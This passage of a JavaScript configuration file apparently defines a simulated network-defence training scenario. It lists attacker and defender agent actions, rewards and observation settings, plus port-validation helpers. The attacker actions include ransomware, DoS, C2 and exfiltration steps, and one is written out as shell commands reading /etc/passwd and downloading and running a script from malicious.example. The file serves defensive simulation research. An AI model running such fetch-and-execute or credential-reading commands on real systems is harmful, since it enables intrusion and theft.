              2: { action: 'node-application-execute', options: { node_name: 'client_1', application_name: 'dos-bot' } },
              3: { action: 'node-application-execute', options: { node_name: 'client_1', application_name: 'ransomware-script' } },
              4: { action: 'node-application-execute', options: { node_name: 'client_2', application_name: 'data-manipulation-bot' } },
              5: { action: 'node-application-execute', options: { node_name: 'client_2', application_name: 'dos-bot' } },
              6: { action: 'node-application-execute', options: { node_name: 'client_2', application_name: 'ransomware-script' } },
              7: { action: 'node-send-remote-command', options: { node_name: 'client_1', remote_ip: '192.168.1.14', command: ['bash', '-lc', 'cat /etc/passwd'] } },
              8: { action: 'configure-ransomware-script', options: { node_name: 'client_1', server_ip_address: '192.168.10.200', server_password: 'c2pass', payload: 'encrypt' } },
              9: { action: 'configure-c2-beacon', options: { node_name: 'client_1', c2_server_ip_address: '192.168.10.200', keep_alive_frequency: 10, masquerade_protocol: 'tcp', masquerade_port: 80 } },
              10: { action: 'configure-database-client', options: { node_name: 'client_1', server_ip_address: '192.168.1.14', server_password: 'db_pass' } },
              11: { action: 'configure-dos-bot', options: { node_name: 'client_1', target_ip_address: '192.168.1.12', target_port: 'POSTGRES_SERVER', payload: 'SPOOF DATA', repeat: false, port_scan_p_of_success: 0.8, dos_intensity: 1.0, max_sessions: 500 } },
              12: { action: 'c2-server-ransomware-launch', options: { node_name: 'c2_server' } },
              13: { action: 'c2-server-terminal-command', options: { node_name: 'c2_server', commands: ['wget http://malicious.example/payload.sh -O /tmp/payload.sh', 'bash /tmp/payload.sh'], ip_address: '192.168.10.200', username: 'admin', password: 'supersecret' } },
              14: { action: 'c2-server-data-exfiltrate', options: { node_name: 'c2_server', target_ip_address: '192.168.10.21', target_file_name: 'secret.db', target_folder_name: 'secrets', exfiltration_folder_name: 'stolen', username: 'user', password: 'pass' } },
              15: { action: 'c2-server-ransomware-configure', options: { node_name: 'c2_server', server_ip_address: '192.168.1.14', server_password: 'c2pass', payload: 'encrypt' } },
              16: { action: 'node-file-corrupt', options: { node_name: 'database_server', folder_name: 'database', file_name: 'database.db' } }
            }
          },
          reward_function: {
            reward_components: [
              { type: 'database-file-integrity', weight: 1.0, options: { node_hostname: 'database_server', folder_name: 'database', file_name: 'database.db', intact_reward: -0.1, deleted_penalty: 100.0 } },
              { type: 'action-penalty', weight: 0.1, options: { per_action_penalty: { 'do-nothing': -1.0 } } }
            ]
          }
        },
        {
          ref: 'defender',
          team: 'BLUE',
          type: 'proxy-agent',
          observation_space: {
            type: 'nodes',
            options: {
              hosts: [
                { hostname: 'domain_controller' },
                { hostname: 'web_server', services: [{ service_name: 'web-server' }] },
                { hostname: 'database_server', folders: [{ folder_name: 'database', files: [{ file_name: 'database.db' }] }] },
                { hostname: 'backup_server' },
                { hostname: 'security_suite' },
                { hostname: 'client_1' },
                { hostname: 'client_2' },
                { hostname: 'c2_server' }
              ],
              num_services: 1,
              num_applications: 0,
              num_folders: 1,
              num_files: 1,
              num_nics: 2,
              include_num_access: false,
              include_nmne: true,
              monitored_traffic: {
                icmp: ['NONE'],
                tcp: ['DNS']
              },
              routers: [{ hostname: 'router_1' }],
              num_ports: 0,
              ip_list: ['192.168.1.10', '192.168.1.12', '192.168.1.14', '192.168.1.16', '192.168.1.110', '192.168.10.21', '192.168.10.22', '192.168.10.110', '192.168.10.200'],
              wildcard_list: ['0.0.0.1'],
              port_list: ['HTTP', 'POSTGRES_SERVER', 80],
              protocol_list: ['ICMP', 'TCP', 'UDP'],
              num_rules: 10
            }
          },
          agent_settings: { flatten_obs: true, action_masking: true },
          action_space: {
            action_map: {
              0: { action: 'do-nothing', options: {} },
              1: { action: 'node-service-scan', options: { node_name: 'web_server', service_name: 'web-server' } },
              2: { action: 'node-service-stop', options: { node_name: 'web_server', service_name: 'web-server' } },
              3: { action: 'node-service-start', options: { node_name: 'web_server', service_name: 'web-server' } },
              4: { action: 'node-service-pause', options: { node_name: 'web_server', service_name: 'web-server' } },
              5: { action: 'node-service-resume', options: { node_name: 'web_server', service_name: 'web-server' } },
              6: { action: 'node-service-restart', options: { node_name: 'web_server', service_name: 'web-server' } },
              7: { action: 'node-service-disable', options: { node_name: 'web_server', service_name: 'web-server' } },
              8: { action: 'node-service-enable', options: { node_name: 'web_server', service_name: 'web-server' } },
              9: { action: 'node-file-scan', options: { node_name: 'database_server', folder_name: 'database', file_name: 'database.db' } },
              10: { action: 'node-file-scan', options: { node_name: 'database_server', folder_name: 'database', file_name: 'database.db' } },
              11: { action: 'node-file-delete', options: { node_name: 'database_server', folder_name: 'database', file_name: 'database.db' } },
              12: { action: 'node-file-repair', options: { node_name: 'database_server', folder_name: 'database', file_name: 'database.db' } },
              13: { action: 'node-service-fix', options: { node_name: 'database_server', service_name: 'database-service' } },
              14: { action: 'node-folder-scan', options: { node_name: 'database_server', folder_name: 'database' } },
              15: { action: 'node-folder-scan', options: { node_name: 'database_server', folder_name: 'database' } },
              16: { action: 'node-folder-repair', options: { node_name: 'database_server', folder_name: 'database' } },
              17: { action: 'node-folder-restore', options: { node_name: 'database_server', folder_name: 'database' } },
              18: { action: 'node-os-scan', options: { node_name: 'domain_controller' } },
              19: { action: 'node-shutdown', options: { node_name: 'domain_controller' } },
              20: { action: 'node-startup', options: { node_name: 'domain_controller' } },
              21: { action: 'node-reset', options: { node_name: 'domain_controller' } },
              22: { action: 'node-os-scan', options: { node_name: 'web_server' } },
              23: { action: 'node-shutdown', options: { node_name: 'web_server' } },
              24: { action: 'node-startup', options: { node_name: 'web_server' } },
              25: { action: 'node-reset', options: { node_name: 'web_server' } },
              26: { action: 'node-os-scan', options: { node_name: 'database_server' } },
              27: { action: 'node-shutdown', options: { node_name: 'database_server' } },
              28: { action: 'node-startup', options: { node_name: 'database_server' } },
              29: { action: 'node-reset', options: { node_name: 'database_server' } },
              30: { action: 'node-os-scan', options: { node_name: 'backup_server' } },
              31: { action: 'node-shutdown', options: { node_name: 'backup_server' } },
              32: { action: 'node-startup', options: { node_name: 'backup_server' } },
              33: { action: 'node-reset', options: { node_name: 'backup_server' } },
              34: { action: 'node-os-scan', options: { node_name: 'security_suite' } },
              35: { action: 'node-shutdown', options: { node_name: 'security_suite' } },
              36: { action: 'node-startup', options: { node_name: 'security_suite' } },
              37: { action: 'node-reset', options: { node_name: 'security_suite' } },
              38: { action: 'node-os-scan', options: { node_name: 'client_1' } },
              39: { action: 'node-shutdown', options: { node_name: 'client_1' } },
              40: { action: 'node-startup', options: { node_name: 'client_1' } },
              41: { action: 'node-reset', options: { node_name: 'client_1' } },
              42: { action: 'node-os-scan', options: { node_name: 'client_2' } },
              43: { action: 'node-shutdown', options: { node_name: 'client_2' } },
              44: { action: 'node-startup', options: { node_name: 'client_2' } },
              45: { action: 'node-reset', options: { node_name: 'client_2' } },
              46: { action: 'router-acl-add-rule', options: { target_router: 'router_1', position: 0, permission: 'DENY', src_ip: '192.168.10.21', dst_ip: 'ALL', src_port: 'ALL', dst_port: 'ALL', protocol_name: 'ALL', src_wildcard: 'NONE', dst_wildcard: 'NONE' } },
              47: { action: 'router-acl-add-rule', options: { target_router: 'router_1', position: 1, permission: 'DENY', src_ip: '192.168.10.22', dst_ip: 'ALL', src_port: 'ALL', dst_port: 'ALL', protocol_name: 'ALL', src_wildcard: 'NONE', dst_wildcard: 'NONE' } },
              48: { action: 'router-acl-add-rule', options: { target_router: 'router_1', position: 2, permission: 'DENY', src_ip: '192.168.10.21', dst_ip: '192.168.1.12', src_port: 'ALL', dst_port: 'ALL', protocol_name: 'TCP', src_wildcard: 'NONE', dst_wildcard: 'NONE' } },
              49: { action: 'router-acl-add-rule', options: { target_router: 'router_1', position: 3, permission: 'DENY', src_ip: '192.168.10.22', dst_ip: '192.168.1.12', src_port: 'ALL', dst_port: 'ALL', protocol_name: 'TCP', src_wildcard: 'NONE', dst_wildcard: 'NONE' } },
              50: { action: 'router-acl-add-rule', options: { target_router: 'router_1', position: 4, permission: 'DENY', src_ip: '192.168.10.21', dst_ip: '192.168.1.14', src_port: 'ALL', dst_port: 'ALL', protocol_name: 'TCP', src_wildcard: 'NONE', dst_wildcard: 'NONE' } },
              51: { action: 'router-acl-add-rule', options: { target_router: 'router_1', position: 5, permission: 'DENY', src_ip: '192.168.10.22', dst_ip: '192.168.1.14', src_port: 'ALL', dst_port: 'ALL', protocol_name: 'TCP', src_wildcard: 'NONE', dst_wildcard: 'NONE' } },
              52: { action: 'router-acl-remove-rule', options: { target_router: 'router_1', position: 0 } },
              53: { action: 'router-acl-remove-rule', options: { target_router: 'router_1', position: 1 } },
              54: { action: 'router-acl-remove-rule', options: { target_router: 'router_1', position: 2 } },
              55: { action: 'router-acl-remove-rule', options: { target_router: 'router_1', position: 3 } },
              56: { action: 'router-acl-remove-rule', options: { target_router: 'router_1', position: 4 } },
              57: { action: 'router-acl-remove-rule', options: { target_router: 'router_1', position: 5 } },
              58: { action: 'router-acl-remove-rule', options: { target_router: 'router_1', position: 6 } },
              59: { action: 'router-acl-remove-rule', options: { target_router: 'router_1', position: 7 } },
              60: { action: 'router-acl-remove-rule', options: { target_router: 'router_1', position: 8 } },
              61: { action: 'router-acl-remove-rule', options: { target_router: 'router_1', position: 9 } },
              62: { action: 'host-nic-disable', options: { node_name: 'domain_controller', nic_num: 1 } },
              63: { action: 'host-nic-enable', options: { node_name: 'domain_controller', nic_num: 1 } },
              64: { action: 'host-nic-disable', options: { node_name: 'web_server', nic_num: 1 } },
              65: { action: 'host-nic-enable', options: { node_name: 'web_server', nic_num: 1 } },
              66: { action: 'host-nic-disable', options: { node_name: 'database_server', nic_num: 1 } },
              67: { action: 'host-nic-enable', options: { node_name: 'database_server', nic_num: 1 } },
              68: { action: 'host-nic-disable', options: { node_name: 'backup_server', nic_num: 1 } },
              69: { action: 'host-nic-enable', options: { node_name: 'backup_server', nic_num: 1 } },
              70: { action: 'host-nic-disable', options: { node_name: 'security_suite', nic_num: 1 } },
              71: { action: 'host-nic-enable', options: { node_name: 'security_suite', nic_num: 1 } },
              72: { action: 'host-nic-disable', options: { node_name: 'security_suite', nic_num: 2 } },
              73: { action: 'host-nic-enable', options: { node_name: 'security_suite', nic_num: 2 } },
              74: { action: 'host-nic-disable', options: { node_name: 'client_1', nic_num: 1 } },
              75: { action: 'host-nic-enable', options: { node_name: 'client_1', nic_num: 1 } },
              76: { action: 'host-nic-disable', options: { node_name: 'client_2', nic_num: 1 } },
              77: { action: 'host-nic-enable', options: { node_name: 'client_2', nic_num: 1 } },
              78: { action: 'node-application-scan', options: { node_name: 'client_1', application_name: 'web-browser' } },
              79: { action: 'node-application-scan', options: { node_name: 'client_2', application_name: 'web-browser' } },
              80: { action: 'node-application-close', options: { node_name: 'client_1', application_name: 'data-manipulation-bot' } },
              81: { action: 'node-application-close', options: { node_name: 'client_2', application_name: 'data-manipulation-bot' } },
              82: { action: 'router-acl-add-rule', options: { target_router: 'router_1', position: 6, permission: 'DENY', src_ip: '192.168.10.21', dst_ip: 'ALL', src_port: 'ALL', dst_port: 'ALL', protocol_name: 'ALL', src_wildcard: 'NONE', dst_wildcard: 'NONE' } },
              83: { action: 'router-acl-add-rule', options: { target_router: 'router_1', position: 7, permission: 'DENY', src_ip: '192.168.10.22', dst_ip: 'ALL', src_port: 'ALL', dst_port: 'ALL', protocol_name: 'ALL', src_wildcard: 'NONE', dst_wildcard: 'NONE' } }
            }
          },
          reward_function: {
            reward_components: [
              { type: 'database-file-integrity', weight: 1.0, options: { node_hostname: 'database_server', folder_name: 'database', file_name: 'database.db', intact_reward: 0.0, deleted_penalty: -10.0 } },
              { type: 'webpage-unavailable-penalty', weight: 0.25, options: { node_hostname: 'web_server', penalty: -0.1 } },
              { type: 'green-admin-database-unreachable-penalty', weight: 0.2, options: { node_hostname: 'database_server', penalty: -0.1 } },
              { type: 'action-penalty', weight: 0.5, options: { per_action_penalty: { 'node-file-corrupt': -0.5, 'node-shutdown': -0.5, 'node-application-stop': -0.1 } } },
              { type: 'shared-reward', weight: 0.5, options: { agent_name: 'client_1_green_user' } },
              { type: 'shared-reward', weight: 0.5, options: { agent_name: 'client_2_green_user' } }
            ]
          }
        }
      ]
    }
  },
}

// Helper functions
export const getPortNumber = (portName) => {
  const port = PREDEFINED_PORTS.find(p => p.value === portName)
  return port ? port.port : null
}

export const isValidPort = (value) => {
  return PREDEFINED_PORTS.some(p => p.value === value || p.port === value)
}

export const isValidProtocol = (value) => {
  return PREDEFINED_PROTOCOLS.some(p => p.value === value)
}

export const isValidNodeType = (value) => {
  return NODE_TYPES.some(n => n.value === value)
}

export const isValidService = (value) => {
  return AVAILABLE_SERVICES.some(s => s.value === value)
}

export const isValidApplication = (value) => {
  return AVAILABLE_APPLICATIONS.some(a => a.value === value)
}

// Helper function to get recommended ports for node type (deprecated - all options are valid)
export const getRecommendedPorts = (nodeType) => {
  switch (nodeType) {
    case 'server':
      return ['HTTP', 'HTTPS', 'SSH', 'FTP', 'MYSQL', 'POSTGRES_SERVER', 'DNS']
    case 'computer':
      return ['HTTP', 'HTTPS', 'SSH', 'RDP', 'SMB']
    case 'router':
      return ['SSH', 'HTTPS', 'SNMP', 'DNS', 'ARP']
    default:
      return ['HTTP', 'HTTPS', 'SSH']
  }
}
